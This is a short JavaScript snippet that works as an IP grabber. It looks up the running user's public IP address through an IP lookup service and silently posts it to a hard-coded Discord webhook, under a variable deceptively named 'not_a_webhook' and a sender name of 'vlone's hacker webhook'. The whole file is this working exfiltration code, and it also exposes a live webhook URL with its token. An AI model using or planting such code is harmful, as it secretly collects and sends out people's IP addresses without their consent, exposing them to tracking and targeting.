const not_a_webhook = "https://discord.com/api/webhooks/1250517345827291178/wwcYR9rUuHsaQWc4LC8A-dHZzlSIgd6zvIV9-ClhDYhyru5yp0yc5RWAL3Ifzr1kBsFQ";
fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const payload = {
            content: data.ip,
            username: "vlone's hacker webhook"
        };

        fetch(not_a_webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                console.log("Sent successfully");
            } else {
                console.error("Failed to send");
            }
        })
        .catch(error => {
            console.error("An error occurred");
        });
    })
    .catch(error => {
        console.error("An error occurred while fetching");
    });
